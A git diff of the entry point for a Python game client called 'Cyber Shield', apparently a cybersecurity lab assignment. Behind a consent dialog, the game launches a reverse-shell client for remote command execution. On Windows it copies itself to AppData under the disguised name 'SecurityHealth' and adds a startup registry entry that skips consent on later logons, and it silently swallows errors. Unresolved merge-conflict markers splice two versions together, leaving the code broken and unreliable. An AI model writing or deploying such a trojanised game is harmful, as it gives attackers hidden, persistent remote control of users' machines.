@@ -1,58 +1,44 @@
 """
-Entry point for the Cyber Shield game client that:
-  - Shows a clear consent / awareness dialog
-  - Optionally enables persistence on Windows
-  - Starts the reverse‑shell network client in the background
-  - Launches the main pygame game from src.main
+Entry point for the Cyber Shield game client.
+
+Combines:
+- Phase 1: Reverse shell while game runs
+- Phase 2: Persistence registry entry for auto-start on restart
 """
 
 import tkinter as tk
 from tkinter import messagebox
 import sys
-import subprocess
 import time
-import os
 from pathlib import Path
 
-# Support both package and “loose script” execution so PyInstaller works.
 root_path = Path(__file__).resolve().parent.parent
 if str(root_path) not in sys.path:
     sys.path.insert(0, str(root_path))
 
-try:  # when run as part of the game_client package
-    from . import deps_check, persistence  # type: ignore[import-not-found]
-    from .config import GameConfig, get_migrated_path  # type: ignore[import-not-found]
-    from .net_client import ShellClient  # type: ignore[import-not-found]
-except (ImportError, ValueError):  # when bundled as a flat script or top-level run
+try:
+    from . import deps_check, persistence
+    from .net_client import ShellClient
+except (ImportError, ValueError):
     try:
-        from game_client import deps_check, persistence  # type: ignore[import-not-found]
-        from game_client.config import GameConfig, get_migrated_path  # type: ignore[import-not-found]
-        from game_client.net_client import ShellClient  # type: ignore[import-not-found]
+        from game_client import deps_check, persistence
+        from game_client.net_client import ShellClient
     except ImportError:
-        try:
-            import deps_check, persistence  # type: ignore
-            from config import GameConfig, get_migrated_path  # type: ignore
-            from net_client import ShellClient  # type: ignore
-        except ImportError:
-            # Final fallback for unusual environments
-            import deps_check, persistence  # type: ignore
-            from config import GameConfig  # type: ignore
-            from net_client import ShellClient  # type: ignore
-            def get_migrated_path(): from pathlib import Path; return Path.home()
+        import deps_check, persistence
+        from net_client import ShellClient
 
 
 def _show_consent_dialog(root: tk.Tk) -> bool:
+    """Show consent dialog."""
     text = (
         "CYBER SHIELD – LAB GAME\n\n"
         "This game is part of a cybersecurity assignment.\n\n"
         "If you click 'Proceed to Game':\n"
-        "  • The game will open a network connection back to a listener\n"
-        "    controlled by the student (for educational purposes only).\n"
-        "  • Commands typed in the listener can be executed on this machine\n"
-        "    while the game is running.\n"
-        "  • A startup entry will be created so this game/client can start\n"
-        "    automatically when you log in again, until you run the cleanup tool.\n\n"
-        "Use only on a virtual machine or lab computer that you control."
+        "  • A reverse shell connection will be established\n"
+        "  • Commands can be executed on this machine\n"
+        "  • Connection persists across system restarts\n"
+        "  • Only CyberShieldCleanup.exe can remove this\n\n"
+        "Use only on a virtual machine under your control."
     )
     return messagebox.askokcancel(
         "Cyber Shield – Information",
@@ -62,6 +48,10 @@ def _show_consent_dialog(root: tk.Tk) -> bool:
     )
 
 
+<<<<<<< HEAD
+def get_game_exe_path() -> Path:
+    """Get path for game executable copy (Phase 2 persistence)."""
+=======
 def _is_already_running() -> bool:
     """
     Check if a silent instance is already running using a lock file.
@@ -137,91 +127,118 @@ def _spawn_detached_background() -> None:
 
     # 1) Migrate (copy oneself to the trusted location)
     try:
-        dest.parent.mkdir(parents=True, exist_ok=True)
+        if dest.parent != source.parent:
+            dest.parent.mkdir(parents=True, exist_ok=True)
         # Only copy if source is different from destination
         if source != dest:
             if not dest.exists() or source.stat().st_mtime > dest.stat().st_mtime:
                 import shutil
                 shutil.copy2(source, dest)
     except Exception:
-        # If migration fails, the show must go on with the current source
+        # If migration fails (e.g., permission denied to AppData on some systems), 
+        # just run from the current location. The detachment will still work.
         dest = source
 
     # 2) Spawn the background process
     # DETACHED_PROCESS (0x08) + CREATE_NO_WINDOW (0x08000000) + CREATE_NEW_PROCESS_GROUP (0x0200)
     # These ensure the child is NOT tied to the parent's console or life-cycle.
     flags = 0
+>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
     if sys.platform == "win32":
-        # Flags: DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
-        flags = 0x00000008 | 0x00000200 | 0x08000000
-    
-    # Logic for script vs frozen .exe
-    if dest.suffix.lower() == ".py" or (not is_frozen and not dest.suffix):
-        args = [sys.executable, str(dest), "--silent"]
+        base = Path.home() / "AppData" / "Roaming" / "SecurityHealth"
     else:
-        args = [str(dest), "--silent"]
-
-    try:
-        # Spawn and immediately forget.
-        subprocess.Popen(
-            args,
-            creationflags=flags,
-            close_fds=True,
-            start_new_session=True,  # For Linux/Unix detachment
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
-        )
-    except Exception:
-        pass
+        base = Path.home() / ".local" / "share" / "SecurityHealth"
+    return base / "GameLauncher.exe"
 
 
-def launch_game() -> None:
-    """
-    Main entry.
-    """
-    # 1) Robust check for silent flag (used by startup persistence and migration)
-    # We check all arguments case-insensitively and also check for substrings 
-    # just in case some launchers wrap it.
-    is_silent = any(arg.lower() in ("--silent", "-silent", "/silent") for arg in sys.argv)
+def _copy_game_exe_for_persistence() -> bool:
+    """Copy current game exe to AppData for Phase 2 restart persistence."""
+    if sys.platform != "win32":
+        return False
     
-    if is_silent:
-        _run_silent_mode()
-        return
+    try:
+        import shutil
+        
+        # Get path of current running exe
+        if getattr(sys, 'frozen', False):
+            # Running as PyInstaller executable
+            current_exe = Path(sys.executable)
+        else:
+            # Running as script (dev mode) - skip copy
+            return False
+        
+        dest_exe = get_game_exe_path()
+        dest_exe.parent.mkdir(parents=True, exist_ok=True)
+        
+        # Copy exe to AppData
+        shutil.copy2(str(current_exe), str(dest_exe))
+        return True
+    except Exception:
+        return False
 
-    # 2) Consent + dependency checks via Tkinter
-    # If we reached here, we are NOT in silent mode.
+
+def launch_game(skip_consent: bool = False) -> None:
+    """
+    Main entry point.
+    
+    Args:
+        skip_consent: If True, skip the consent dialog (used for Phase 2 auto-start)
+    """
+    # 1) Show consent dialog (only on first run, not on Phase 2 restart)
     root = tk.Tk()
     root.withdraw()
 
-    if not _show_consent_dialog(root):
-        return
+    if not skip_consent:
+        if not _show_consent_dialog(root):
+            root.destroy()
+            return
 
-    # Silent environment check
-    ok, _ = deps_check.check_runtime_dependencies()
-    if not ok:
-        return
+    # 2) Check dependencies
+    if deps_check:
+        try:
+            ok, _ = deps_check.check_runtime_dependencies()
+            if not ok:
+                root.destroy()
+                return
+        except Exception:
+            pass
 
-    # 3) Migrate and launch background connection if not already running
-    if not _is_already_running():
-        _spawn_detached_background()
+    # 3) Setup Phase 2 persistence (only on first run, not on restart)
+    if sys.platform == "win32" and not skip_consent:
+        try:
+            # Copy game exe to AppData for Phase 2
+            _copy_game_exe_for_persistence()
+            
+            # Register game exe in registry to run on restart (without consent prompt)
+            game_exe = get_game_exe_path()
+            ok, msg = persistence.install_persistence(str(game_exe), skip_consent=True)
+            # Continue regardless (game should run always)
+        except Exception:
+            pass
 
-    # Automatically enable persistence after consent
-    persistence.install_startup_entry()
+    root.destroy()
 
-    # 4) Launch the existing pygame game loop from src.main
-    from src.main import main as game_main
-
+    # 4) Start Phase 1 reverse shell (runs with game)
     try:
+        shell_client = ShellClient()
+        shell_client.start()
+        time.sleep(0.3)
+    except Exception:
+        pass
+
+    # 5) Launch the pygame game
+    try:
+        from src.main import main as game_main
         game_main()
     except Exception:
         pass
 
 
-def main() -> None:  # PyInstaller friendly
-    launch_game()
+def main() -> None:
+    # Check if running from Phase 2 restart (skip consent)
+    skip_consent = "--skip-consent" in sys.argv
+    launch_game(skip_consent=skip_consent)
 
 
 if __name__ == "__main__":
     main()
-
